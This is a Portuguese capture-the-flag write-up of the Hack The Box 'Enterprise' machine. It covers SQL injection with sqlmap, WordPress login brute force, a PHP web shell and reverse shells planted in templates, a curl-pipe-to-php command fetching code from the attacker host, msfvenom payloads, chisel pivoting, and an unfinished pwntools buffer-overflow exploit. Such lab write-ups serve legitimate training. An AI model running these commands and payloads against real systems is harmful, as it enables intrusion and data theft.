---
title: "Hack The Box - Enterprise"
tags: [Linux,Medium,Gobuster,Wordpress,SQLInjection,Burpsuite,Metasploit,Reverse Port Forwading,Pivoting,Buffer Overflow Linux,Web]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/112>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 4 portas abertas no servidor

> Porta 22 - SSH

> Portas 80, 443 e 8080 - Servidores Web

Bom, já que encontramos um VHOST no nmap, vamos adicionar ele no nosso /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_hosts.png)

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_web.png)

Muito estranho, olhando no código fonte dela encontramos algo bacana

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_web1.png)

Ele faz as requisição para `enterprise.htb`, então devemos adicionar ela ao nosso /etc/hosts também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_hosts.png)

Ao atualizar a página temos ela como deveria ser

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_web2.png)

O que achamos de útil aqui é o fato dela ser um WordPress e possivelmente ter um usuário `william.riker`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_web3.png)

### Gobuster

Rodamos o gobuster nessa página pra ver se encontramos algo de útil, e vamos enumerando na mão também

`gobuster dir -u http://10.10.10.61/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_gobuster.png)

Nada de interessante, por enquanto

### Wpscan

Podemos rodar o wpscan também, pois com ele podemos enumerar possíveis vulnerabilidades e usuários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_wpscan.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_wpscan1.png)

Apenas confirmou, temos o usuário `william.riker` no servidor

Bom, vamos prosseguir

## Enumeração da porta 8080

Abrimos a página na porta 8080, encontramos apenas um campo de login de útil, mas fora isso nada que possamos explorar por hora, o gobuster também não retornou nada de útil

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_8080.png)

### Gobuster

Rodamos o gobuster nele também

`gobuster dir -u http://10.10.10.61:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_gobuster3.png)

Assim, deram muitas páginas, mas nada que podemos explorar por hora

### Joomlavs

Sabendo que é joomla, podemos tentar ver se encontramos alguma vulnerabilidade com o `joomlavs`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_jvs.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_jvs1.png)

Baixamos pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_jvs2.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_jvs3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_jvs4.png)

Bom, nada de interessante, mas é sempre bom relembrar a sintaxe e a usabilidade dessas ferramentas

## Enumeração da porta 443

Abrimos a outra porta web disponível na máquina pra ver o que temos nela. No certificado conseguimos possivelmente um usuário `E = jeanlucpicard@enterprise.local`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl.png)

No mais é apenas uma página padrão apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl1.png)

### Gosbuster

Logo, vamos rodar o gobuster nela pra ver se conseguimos algo

`gobuster dir -u https://10.10.10.61/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -k`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_gobuster1.png)

Opa, achamos essa pasta /files no servidor, essa nos parece promissora

## /files

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl2.png)

Baixamos esse arquivo que esta ai

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl3.png)

Extraimos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl4.png)

# Explorando SQLInjection (1º Container)

Bom, encontramos esses três arquivos, possivelmente eles estão disponíveis no site também

O que nos chamou mais atenção foi o lcars_db.php, pois pelo que parece ele faz algum tipo de interação com banco de dados, o que nos abre possibilidade de testar SQLInjection, mas vamos analisar os dois

lcars_dbpost.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl5.png)

lcars_db.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl6.png)

O que nos chamou atenção é eles estarem fazendo um include no wp-config.php, ou seja, podemos fazer algum tipo de dump nessas informações, caso consigamos sqlinjecition.

Bom, vamos acessar eles no servidor pra ver o que temos, lembrando aqui que devemos acessar via o site da porta 80, uma vez que é lá que temos o `wordpress` sendo executado e por ser um "plugin", vai estar dentro da pasta dos plugins no wp-content

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl7.png)

O erro que nos foi dado é que não conseguiu ler a "query", claro pq nenhuma foi passada, vamos corrigir isso então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_ssl8.png)

Opa... Algo interessante, essa mensagem de erro nos indica que possivelmente esse servidor está vulnerável a SQLInjection

## SQLMAP

Vamos tentar explorar isso com o sqlmap (não sei como fazer manualmente, se você souber me avise, por favor)

### Através das databases

Aqui vou salvar a requisição pelo BurpSuite e com ela salva em um arquivo vou rodar o sqlmap nela (sim, da pra fazer manualmente, direto, mas isso vou mostrar depois)

Mandamos a requisição para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp1.png)

Mandamos para um arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp3.png)

Agora executamos o SQLMAP na requisição

`sqlmap -r lcars.req --batch` (o --batch é ele já dar Yes em tudo que vier)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp5.png)

Descobirmos o banco de dados, agora vamos verificar quais são as dbs que existem

`sqlmap -r lcars.req --batch --dbs`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp7.png)

Hum... a que nos chamou atenção foi a `wordpress`, então fazemos o dump dela

`sqlmap -r lcars.req --batch -D wordpress --dump`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp8.png)

Encontramos um login e um hash de usuário (william.riker:$P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.)

Encontramos também algo relacionado a senhas! Ta meio ruim de ler, tem que ser bem sutil na olhada, mas ta ai

```
Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp12.png)

Não conseguimos quebrar ela, então vamos fazer o dump de outra database

`sqlmap -r lcars.req --batch -D joomladb --dump`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp10.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_burp11.png)

Encontramos algo interssante aqui! Dois usuários que não tinhamos visto antes

`geordi.la.forge@enterprise.htb` e `guinan@enterprise.htb`

### Direto no SQLMAP (nas pastas)

Bom, isso realmente demora um bocado pra encontrar, e se o cara passa o olho não ve, praticamente já era... Pra evitar que isso ocorra, você pode deixar rodando o SQLMAP pra fazer dump em todas as databases e depois ir na pasta onde ele salva as coisas e pesquisar por senhas

> `sqlmap -r lcars.req --batch --dump`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_al.png)

Ai demora pra uma caceta... muito tempo mesmo, mas enquanto isso você pode ir nas pastas do SQLMAP e ir pesquisando

> `/root/.sqlmap/output/10.10.10.61`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_al1.png)

Vamos pesquisar por `password`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_al2.png)

Aqui realmente é ir vendo um por um até achar oq nós queremos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_al3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_al4.png)

Ai está.... "Arrumando" ele fica assim

Então temos três possíveis e-mails e 4 passwords

senhas.txt
```
Needed somewhere to put some passwords quickly
ZxJyhGem4k338S2Y
enterprisencc170
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6
```

user.txt
```
geordi.la.forge@enterprise.htb
guinan@enterprise.htb
william.riker
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista.png)

## Conseguindo acesso Wordpress

Bom, agora devemos testar com o `wpscan` pra ver se ele encontra algum login e senha válido

`wpscan --url http://10.10.10.61/ -U user.txt -P senhas.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista1.png)

Conseguimos um login válido!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista2.png)

`Username: william.riker, Password: u*Z14ru0p#ttj83zS6`

Bom, agora é só acessar o site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista5.png)

Agora vamos explorar duas maneiras de se pegar shell nessa máquina, uma através do `Metasploit Framework` outra de maneira manual

## Pegando um shell (1º Manual)

Bom, devemos ir até `Appearance`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista6.png)

Clicamos em `Editor` e após isso no lado direito em `404 Template`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista7.png)

Agora adicionamos nosso reverse shell dentro do código da página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista8.png)

Modificamos o IP e Porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista9.png)

Colocamos no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista10.png)

Atualizamos e acessamos

> http://10.10.10.61/wp-content/themes/twentyseventeen/404.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista11.png)

Recebemos a reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lista12.png)

## Pegando um shell (2º Metasploit Framework)

Também podemos pegar essa reverse shell através do metasploit framework

> use unix/webapp/wp_admin_shell_upload

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_msf.png)

Era pra ter dado certo também, não sei pq não deu, possivelmente pq ele não ta conseguindo fazer o upload corretamente

Mas vamos prosseguir, fica a dica desse módulo do metasploit framework

## Estamos em um Container!

A primeira coisa que verificamos ao ganhar shell nessa máquina é o fato de estarmos dentro de um container, podemos comprovar isso vendo os IPs

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_cont.png)

Bom, uma vez que nós conseguimos um shell pelo wordpress, é possível que tenha a senha de acesso ao banco de dados, devemos verificar no arquivo `wp-config.php`

Ai está `root:NCC-1701E`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_cont1.png)

Bom, sabendo que estamos em um container, agora o próximo passo é verificar quais são os endereços/máquinas que esse container tem contato, pra podermos pivotear para elas. Com os comandos `ip neigh` e `cat /etc/hosts` podemos verificar, que a máquina que precisamos pivotear é a 172.16.0.2, pois ela está com a tag de mysql 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_cont2.png)

Bom, muito provavelmente vamos precisar fazer um pivoting para o servidor 172.16.0.2, pois queremos acessar o mysql dele pra ver o que conseguimos lá (realmente não era necessário, pq eu já tenho as credenciais, mas vamos praticar esse pivoting)

Vamos fazer de duas maneiras, uma através do metasploit framework, após ganhar uma seção de meterepreter e pivotear via proxychains e a outra através do chisel

# Pivoting com Chisel (Reverse)

Bom, chisel é uma ferramenta excepcional quando falamos de pivoting. É muito útil quando não temos uma conexão SSH, por exemplo. E ela pode ser usada tanto em linux quanto windows, e é de fácil uso e entendimento de sua sintaxe... Vamos lá

O repositório dele no github é: `https://github.com/jpillora/chisel`

O ideal seriamos compilarmos ela, mas o próprio autor já disponibiliza releases que facilitam nosso trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_chi.png)

Baixamos o arquivo e passamos ele para a máquina invadida e para a pasta de trabalho nossa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_chi1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_chi2.png)

## Setando o Server

Agora devemos ligar nosso servidor, na máquina Kali, para podermos receber as conexões

./chisel server -p 8000 --reverse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_chi3.png)

## Setando o Client

Setamos o cliente e recebemos a conexão

./chisel client 10.10.14.40:8000 R:3306:172.17.0.2:3306

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_chi4.png)

Comprovando que recebemos a conexão na porta 3306

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_chi5.png)

Agora realizamos o login no banco de dados com as credenciais encontradas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_chi6.png)

# Pivoting com Chisel (Socks Proxy 1º Modo)

Agora vamos demonstrar outro modo, ainda com o chisel em que a máquina invadida serve como um socks proxy

## Setamos nosso Server

./chisel server -p 8000 --reverse na nossa máquina local

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_proxy.png)

## Setando o Cliente

./chisel client 10.10.14.40:8000 R:8001:127.0.0.1:9001 - Nesse momento, tudo que for direcionado para a minha Kali porta 8001 vai ser mandado pra porta 9001 do alvo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_proxy1.png)

## Setando o Servidor no Cliente

./chisel server -p 9001 --socks5 - Com isso teremos setado um servidor chisel na máquina invadida escutando na porta 9001, em modo socks

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_socks2.png)

## Setando o Socks na Kali

./chisel client localhost:8001 socks - Com isso vamos se conectar a nossa porta 8001, que por sua vez está recebendo a conexão da porta 9001 invadida, que por sua vez está sendo setada como socks5...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_proxy2.png)

Pronto, a partir desse momento temos o socks proxy habilitado...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_proxy3.png)

# Pivoting com Chisel (Socks Proxy 2º Modo)

Ainda se falando de Chisel podemos facilitar um pouco, um pouco não, muito quando falamos de proxysocks (mas o ideal é entender o que está acontecendo, e para isso o cenário acima descrito foi o melhor)

## Setamos nosso Server

./chisel server -p 8000 --reverse na nossa máquina local

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_proxy.png)

## Setando o Cliente

./chisel client 10.10.14.40:8000 R:socks

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_proxy4.png)

Agora conectamos na database

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_proxy3.png)

Simples assim! Esse chisel é uma excelente ferramenta para se saber como usar, muito útil em diversos cenários

# Pivoting com Meterpreter

Bom, agora até fico sem graça de demonstrar o metasploit framework nesse caso, mas é interessante claro e sempre válido....

Vamos lá, primeiro passo é criar um binário malicioso pelo msfvenom que nos de um shell reverso na máquina

> msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=5555 -f elf -o msf.bin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter.png)

Agora setamos o handler pra receber essa conexão de volta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter1.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter2.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter3.png)

Recebemos a conexão na Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter4.png)

Agora habilitamos o módulo socks4a

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter5.png)

Alteramos o proxychains.conf

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter6.png)

Agora acessamos a base da dados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_meter7.png)

Vou apressar no dump das senhas, pq não vamos conseguir nada além do que já temos, ai está, o usuário geordi.la.forge

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_dump.png)

# Explorando Joomla (2º Container)

Bom, agora já chega de demonstrações, vamos dar prosseguimento na exploração dessa máquina. Para isso agora vamos acessar o joomla que tem na porta 8080, uma vez que nós já temos as credenciais, fica fácil

Então acessamos o painel de login do joomla

```
geordi.la.forge
ZD3YxfnSjezg67JZ
```

> http://10.10.10.61:8080/administrator/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j2.png)

## Pegando Shell de Joomla

Bom, como temos acesso ao painel de configuração, agora fica fácil de conseguirmos um shell nessa máquina

Acessamos os `Templates` (Extensions - Templates)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j3.png)

Acessamos o `Protostar`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j4.png)

Acessamos o `index.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j5.png)

Adicionamos nosso "shell" ai dentro dele

> echo system($_REQUEST['cmd']);

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j6.png)

Salvamos e acessamos pela página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j8.png)

Agora pegamos nossa reverse shell

`curl 10.10.14.40/php-reverse-shell.php | php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j7.png)

Recebemos a conexão

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j9.png)

## Estamos em outro container!

Verificando o ip da máquina, percebemos que estamos em outro container

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j10.png)

Hummm... contudo, olhando as pastas do servidor web encontramos algo que nos chamou atenção, a pasta `files`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j11.png)

Será que é a mesma do servidor na porta 443? Vamos tentar criar um arquivo ali para testar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j12.png)

Agora acessamos na página pra ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j13.png)

Ai está!

# Pegando shell na máquina

Bom, agora vamos upar nosso reverse-php lá dentro pra executar e ganhar uma shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j14.png)

Acessamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j15.png)

Ganhamos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_j16.png)

Agora sim estamos na máquina!

# Escalando privilégio (www-data - root)

Bom, uma vez na máquina real, vamos iniciar nossa escalação de privilégio.

Vamos rodar o linpeas, pra ver o que ele nos traz de bom

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin1.png)

> https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

Baixamos pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin2.png)

Executamos na máquina Enterprise

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin3.png)

Verificamos um binário estranho... lcars, com SUID habilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin4.png)

Também verificamos uma porta alta aberta (que não foi vista no nmap)

Porta - 32812

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin5.png)

Verificamos o que é essa porta 32812 aberta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_porta.png)

Verificamos o que esse lcars se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_lin6.png)

Humm... interessante, é a mesma saida da porta 32812. Vamos passar ele para nossa máquina pra analisar melhor.

## Verificando binário LCARS

Passamos ele para nossa Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l8.png)

Agora verificamos ele mais de perto

Com o comando `ltrace ./lcars.binary` conseguimos verificar o que ele faz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l1.png)

Ele faz um strcmp("\n", "picarda1") - Ou seja, a senha de acesso dele é picarda1, outra coisa a se analisar é o fato de utilizar a função strcmp, que é vulnerável a buffer overflow. Então possivelmente devemos realizar algum tipo de buffer nesse binário

## Buffer Overflow

Vamos lá... Buffer Overflow em Linux não é tão trivial ou simples... devemos tomar alguns procedimentos. O primeiro deles é identificar o ponto de buffer overflow

### Descobrindo ponto de Buffer

Jogando um buffer de 500 "A" na aplicação, descobrimos que no campo 4 ele da Segmentation Fault, sugerindo um possível buffer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l2.png)

### Confirmando Buffer e verificando proteções

Para confirmar o buffer, vamos reproduzir ele dentro do gdb e já aproveitar para verificar quais são as proteções que estão habilitadas nesse binário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l4.png)

PIE está habilitado... o que é isso?

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l3.png)

Humm... algo a ver com ASLR estar habilitado, vamos ver na máquina se o ASLR está habilitado lá

No binário ta desabilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l5.png)

Na máquina também!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l9.png)

Desabilitado! Facilitou nosso trabalho... Mas oq isso quer dizer? Quer dizer que a libc vai sempre carregar no mesmo ponto da memória, não precisamos fazer brute force nem nada, apenas copiar o valor e já vai dar certo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l6.png)

Ai está... facilitou muito

Mas vamos lá, vamos confirmar o buffer agora

Primeiro criamos o patternde 500 bytes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l7.png)

Jogamos na aplicação, dentro do campo 4

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l10.png)

Agora verificamos o ESP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l11.png)

Ai está, sobrescrevemos com 212 bytes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l12.png)

Confirmando isso vamos gerar um pattern de 212 com 4 "B" depois dele e jogar na aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l13.png)

Ai está! Temos controle do EIP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-enterprise/E_l14.png)

Agora podemos colocar o que quisermos ser executado nele. Vamos montar o exploit então

## Montando o exploit

O tipo de exploit que iremos montar aqui é a partir de uma técnica chamada ret2libc, ou return to libc, na qual nós iremos utilizar de endereços de memória pra própria libc para ganhar um shell de root na máquina

A estrutura dele fica assim

exploit.py
```
from pwn import *
HOST, PORT = '10.10.10.61', 32812

# Montagem do payload a ser enviado - EIP 212

lixo = '\x90' * 212
ret2libc = p32() # system()
ret2libc += p32() # exit()
ret2libc += p32() # sh

exploit = lixo + ret2libc

# Agora vamos montar a interacao ate o momento do buffer

r = remote(HOST, PORT)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")

# Agora enviamos o payload

r.sendline(exploit)

# Agora tornarmos o shell interativo

r.interactive()
```

A ideia é essa... o esqueleto dele pelo menos, agora vamos pegar os dados que precisamos para preencher o system(), exit() e o sh

## Pegando valores

Bom, eu havia dia anteriormente que iriamos utilizar da técnica de ret2libc, mas não temos os binários instalados na máquina, e mesmo se colocarmos os estáticos creio que não vai da certo, então vamos utilizar de outra técnica a ret2self, onde eu pego endereços do próprio binário para executá-los arbitrariamente

Para isso vamos entrar no gdb dentro da máquina e pegar esses valores...

`p system` - 0xf7e4c060

